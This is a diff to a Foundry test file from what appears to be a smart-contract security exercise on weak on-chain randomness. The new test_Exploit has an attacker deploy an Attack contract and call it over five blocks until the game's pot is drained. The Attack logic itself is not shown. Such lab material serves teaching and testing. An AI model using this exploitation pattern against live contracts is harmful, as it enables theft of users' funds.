@@ -4,7 +4,7 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import {Game2} from "../../src/randomness-vulnerabilities-2/Game2.sol";
-import {Attack} from "../../src/randomness-vulnerabilities-1/Attack.sol";
+import {Attack} from "../../src/randomness-vulnerabilities-2/Attack.sol";
 
 contract TestRandomness2 is Test {
     address deployer;
@@ -27,5 +27,20 @@ contract TestRandomness2 is Test {
         assertEq(address(gameContract).balance, INITIAL_POT);
     }
 
-    function test_Exploit() public {}
+    function test_Exploit() public {
+        uint256 currentBlock = block.number;
+
+        vm.startPrank(attacker);
+        attackContract = new Attack(address(gameContract));
+        vm.deal(address(attackContract), 10 ether);
+
+        for (uint256 index = 0; index < 5; index++) {
+            attackContract.attack();
+            vm.roll(currentBlock + 1 + index);
+        }
+
+        vm.stopPrank();
+
+        assertEq(address(attacker).balance, INITIAL_POT);
+    }
 }
